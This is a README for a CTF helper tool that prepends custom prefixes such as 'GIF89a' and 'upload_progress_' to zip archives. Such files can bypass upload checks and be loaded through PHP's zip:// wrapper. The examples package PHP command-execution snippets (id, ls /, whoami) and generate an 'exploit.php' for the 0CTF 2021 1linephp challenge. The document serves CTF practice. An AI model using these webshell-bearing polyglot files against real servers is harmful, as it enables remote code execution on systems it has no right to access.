# Zip prefix helper

Easy tool to craft zip file with your custom prefix.

## Intro

Inspired by [0CTF/TCTF 2021 Quals - 1linephp](https://ctftime.org/task/16410) and [2016 Plaid CTF - Pixelshop](https://github.com/p4-team/ctf/tree/master/2016-04-15-plaid-ctf/web_pixelshop)

Hope this tool can help anyone who needs to solve the challenge which needs using `zip://` or `unzip` on a weird prefix file.


## Usage


```
usage: helper.py [-h] -z ZIP_PATH -p PREFIX [-s SAMPLE] -o OUTPUT

optional arguments:
  -h, --help            show this help message and exit
  -z ZIP_PATH, --zip-path ZIP_PATH
                        set a path to one target file or folder
  -p PREFIX, --prefix PREFIX
                        set prefix len you want to add to original zip
  -s SAMPLE, --sample SAMPLE
                        set path to sample of prefix file
  -o OUTPUT, --output OUTPUT
                        set output zip path
```



## Example

(you can find demo files in `demo/`)

1. generate `test1.gif` and `test2.gif` with `GIF89a` prefix

- Command

```
python helper.py -z target/id.php -p -1 -s sample/gif -o test1.gif
```
note : `-p -1` => set prefix length to `len(sample_file_content)`

- stdout

```
using file prefix of 'sample/gif' with length : 6
file prefix: b'GIF89a'
Changing Local Header Offset of 'id.php'
done
Changing Central Dir Offset
All Done
00000000: 4749 4638 3961 504b 0304 1400 0000 0800  GIF89aPK........
00000010: a89e e552 0ddb 1b19 1700 0000 1500 0000  ...R............
00000020: 0600 0000 6964 2e70 6870 73b0 b12f c828  ....id.phps../.(
00000030: 5048 4dce c857 48c8 4c49 b0b6 b7e3 e502  PHM..WH.LI......
00000040: 0050 4b01 0214 0314 0000 0008 00a8 9ee5  .PK.............
00000050: 520d db1b 1917 0000 0015 0000 0006 0000  R...............
00000060: 0000 0000 0000 0000 00a4 8106 0000 0069  ...............i
00000070: 642e 7068 7050 4b05 0600 0000 0001 0001  d.phpPK.........
00000080: 0034 0000 0041 0000 0000 00              .4...A.....
```

- Command

```
python helper.py -z target -p -2 -s sample/gif -o test2.gif
```

- stdout

```
using file prefix of 'sample/gif' with length : 6
file prefix: b'GIF89a'
Changing Local Header Offset of 'ls.php'
Changing Local Header Offset of 'id.php'
Changing Local Header Offset of 's.php'
Changing Local Header Offset of 'test/whoami.php'
done
Changing Central Dir Offset
All Done
00000000: 4749 4638 3961 504b 0304 1400 0000 0800  GIF89aPK........
00000010: 95b6 e552 5d43 82bd 1800 0000 1600 0000  ...R]C..........
00000020: 0600 0000 6c73 2e70 6870 73b0 b12f c828  ....ls.phps../.(
00000030: 5048 4dce c857 48c8 2956 d04f b0b6 b7e3  PHM..WH.)V.O....
00000040: 0200 504b 0304 1400 0000 0800 a89e e552  ..PK...........R
00000050: 0ddb 1b19 1700 0000 1500 0000 0600 0000  ................
00000060: 6964 2e70 6870 73b0 b12f c828 5048 4dce  id.phps../.(PHM.
00000070: c857 48c8 4c49 b0b6 b7e3 e502 0050 4b03  .WH.LI.......PK.
00000080: 0414 0000 0008 0081 b8e5 52c1 5f1d cf1c  ..........R._...
00000090: 0000 0020 0000 0005 0000 0073 2e70 6870  ... .......s.php
000000a0: 73b0 b12f c828 5050 8977 770d 8956 4f54  s../.(PP.ww..VOT
000000b0: 8fd5 8032 93d4 6335 aded ed00 504b 0304  ...2..c5....PK..
000000c0: 1400 0000 0800 d8b9 e552 26b5 8fda 1900  .........R&.....
000000d0: 0000 1700 0000 0f00 0000 7465 7374 2f77  ..........test/w
000000e0: 686f 616d 692e 7068 7073 b0b1 2fc8 2850  hoami.phps../.(P
000000f0: 484d cec8 5748 28cf c84f cccd 4cb0 b6b7  HM..WH(..O..L...
00000100: 0300 504b 0102 1403 1400 0000 0800 95b6  ..PK............
00000110: e552 5d43 82bd 1800 0000 1600 0000 0600  .R]C............
00000120: 0000 0000 0000 0000 0000 a481 0600 0000  ................
00000130: 6c73 2e70 6870 504b 0102 1403 1400 0000  ls.phpPK........
00000140: 0800 a89e e552 0ddb 1b19 1700 0000 1500  .....R..........
00000150: 0000 0600 0000 0000 0000 0000 0000 a481  ................
00000160: 4200 0000 6964 2e70 6870 504b 0102 1403  B...id.phpPK....
00000170: 1400 0000 0800 81b8 e552 c15f 1dcf 1c00  .........R._....
00000180: 0000 2000 0000 0500 0000 0000 0000 0000  .. .............
00000190: 0000 a481 7d00 0000 732e 7068 7050 4b01  ....}...s.phpPK.
000001a0: 0214 0314 0000 0008 00d8 b9e5 5226 b58f  ............R&..
000001b0: da19 0000 0017 0000 000f 0000 0000 0000  ................
000001c0: 0000 0000 00a4 81bc 0000 0074 6573 742f  ...........test/
000001d0: 7768 6f61 6d69 2e70 6870 504b 0506 0000  whoami.phpPK....
000001e0: 0000 0400 0400 d800 0000 0201 0000 0000  ................
```

- Demo

```
Psy Shell v0.10.6 (PHP 7.4.16 — cli) by Justin Hileman
New version is available (current: v0.10.6, latest: v0.10.8)
>>> file("zip://out/test1.gif#id.php")
=> [
     "@<?php echo `id`;?>\r\n",
   ]
>>> file("zip://out/test2.gif#ls.php")
=> [
     "@<?php echo `ls /`;?>\n",
   ]
>>> file("zip://out/test2.gif#test/whoami.php")
=> [
     "@<?php echo `whoami`;?>",
   ]
>>> 
```

2. generate session_xxx file to test [0CTF/TCTF 2021 Quals 1linephp](https://ctftime.org/task/16410) on local


- Command

```
python helper.py -z target/id.php -p 16 -s sample/UPLOAD_PROGRESS_ -o session_alanli1
```

- stdout

```
using file prefix of 'sample/UPLOAD_PROGRESS_' with length : 16
file prefix: b'upload_progress_'
Changing Local Header Offset of 'id.php'
done
Changing Central Dir Offset
All Done
00000000: 7570 6c6f 6164 5f70 726f 6772 6573 735f  upload_progress_
00000010: 504b 0304 1400 0000 0800 a89e e552 0ddb  PK...........R..
00000020: 1b19 1700 0000 1500 0000 0600 0000 6964  ..............id
00000030: 2e70 6870 73b0 b12f c828 5048 4dce c857  .phps../.(PHM..W
00000040: 48c8 4c49 b0b6 b7e3 e502 0050 4b01 0214  H.LI.......PK...
00000050: 0314 0000 0008 00a8 9ee5 520d db1b 1917  ..........R.....
00000060: 0000 0015 0000 0006 0000 0000 0000 0000  ................
00000070: 0000 00a4 8110 0000 0069 642e 7068 7050  .........id.phpP
00000080: 4b05 0600 0000 0001 0001 0034 0000 004b  K..........4...K
00000090: 0000 0000 00                             .....
```

- Command

```
python helper.py -z target/ -p 16 -s sample/UPLOAD_PROGRESS_ -o session_alanli2
```

- stdout
  
```
using file prefix of 'sample/UPLOAD_PROGRESS_' with length : 16
file prefix: b'upload_progress_'
Changing Local Header Offset of 'ls.php'
Changing Local Header Offset of 'id.php'
Changing Local Header Offset of 's.php'
Changing Local Header Offset of 'test/whoami.php'
done
Changing Central Dir Offset
All Done
00000000: 7570 6c6f 6164 5f70 726f 6772 6573 735f  upload_progress_
00000010: 504b 0304 1400 0000 0800 95b6 e552 5d43  PK...........R]C
00000020: 82bd 1800 0000 1600 0000 0600 0000 6c73  ..............ls
00000030: 2e70 6870 73b0 b12f c828 5048 4dce c857  .phps../.(PHM..W
00000040: 48c8 2956 d04f b0b6 b7e3 0200 504b 0304  H.)V.O......PK..
00000050: 1400 0000 0800 a89e e552 0ddb 1b19 1700  .........R......
00000060: 0000 1500 0000 0600 0000 6964 2e70 6870  ..........id.php
00000070: 73b0 b12f c828 5048 4dce c857 48c8 4c49  s../.(PHM..WH.LI
00000080: b0b6 b7e3 e502 0050 4b03 0414 0000 0008  .......PK.......
00000090: 0081 b8e5 52c1 5f1d cf1c 0000 0020 0000  ....R._...... ..
000000a0: 0005 0000 0073 2e70 6870 73b0 b12f c828  .....s.phps../.(
000000b0: 5050 8977 770d 8956 4f54 8fd5 8032 93d4  PP.ww..VOT...2..
000000c0: 6335 aded ed00 504b 0304 1400 0000 0800  c5....PK........
000000d0: d8b9 e552 26b5 8fda 1900 0000 1700 0000  ...R&...........
000000e0: 0f00 0000 7465 7374 2f77 686f 616d 692e  ....test/whoami.
000000f0: 7068 7073 b0b1 2fc8 2850 484d cec8 5748  phps../.(PHM..WH
00000100: 28cf c84f cccd 4cb0 b6b7 0300 504b 0102  (..O..L.....PK..
00000110: 1403 1400 0000 0800 95b6 e552 5d43 82bd  ...........R]C..
00000120: 1800 0000 1600 0000 0600 0000 0000 0000  ................
00000130: 0000 0000 a481 1000 0000 6c73 2e70 6870  ..........ls.php
00000140: 504b 0102 1403 1400 0000 0800 a89e e552  PK.............R
00000150: 0ddb 1b19 1700 0000 1500 0000 0600 0000  ................
00000160: 0000 0000 0000 0000 a481 4c00 0000 6964  ..........L...id
00000170: 2e70 6870 504b 0102 1403 1400 0000 0800  .phpPK..........
00000180: 81b8 e552 c15f 1dcf 1c00 0000 2000 0000  ...R._...... ...
00000190: 0500 0000 0000 0000 0000 0000 a481 8700  ................
000001a0: 0000 732e 7068 7050 4b01 0214 0314 0000  ..s.phpPK.......
000001b0: 0008 00d8 b9e5 5226 b58f da19 0000 0017  ......R&........
000001c0: 0000 000f 0000 0000 0000 0000 0000 00a4  ................
000001d0: 81c6 0000 0074 6573 742f 7768 6f61 6d69  .....test/whoami
000001e0: 2e70 6870 504b 0506 0000 0000 0400 0400  .phpPK..........
000001f0: d800 0000 0c01 0000 0000                 ..........
```

- Demo

```
Psy Shell v0.10.6 (PHP 7.4.16 — cli) by Justin Hileman
New version is available (current: v0.10.6, latest: v0.10.8)
>>> file("zip://out/session_alanli1#id.php")
=> [
     "@<?php echo `id`;?>\r\n",
   ]
>>> file("zip://out/session_alanli2#ls.php")
=> [
     "@<?php echo `ls /`;?>\n",
   ]
>>> file("zip://out/session_alanli2#test/whoami.php")
=> [
     "@<?php echo `whoami`;?>",
   ]
>>> 
```


3. generate payload for [0CTF/TCTF 2021 Quals 1linephp](https://ctftime.org/task/16410)

- Command

```bash
python helper.py -z target/s.php -p 16 -o exploit.php
```

- stdout

```
file prefix length: 16
Changing Local Header Offset of 's.php'
done
Changing Central Dir Offset
All Done
00000000: 504b 0304 1400 0000 0800 81b8 e552 c15f  PK...........R._
00000010: 1dcf 1c00 0000 2000 0000 0500 0000 732e  ...... .......s.
00000020: 7068 7073 b0b1 2fc8 2850 5089 7777 0d89  phps../.(PP.ww..
00000030: 564f 548f d580 3293 d463 35ad eded 0050  VOT...2..c5....P
00000040: 4b01 0214 0314 0000 0008 0081 b8e5 52c1  K.............R.
00000050: 5f1d cf1c 0000 0020 0000 0005 0000 0000  _...... ........
00000060: 0000 0000 0000 00a4 8110 0000 0073 2e70  .............s.p
00000070: 6870 504b 0506 0000 0000 0100 0100 3300  hpPK..........3.
00000080: 0000 4f00 0000 0000   
```

### Outro

I'm not an expert at zip structure.

If you found any bugs or have any suggestions, feel free to issue!
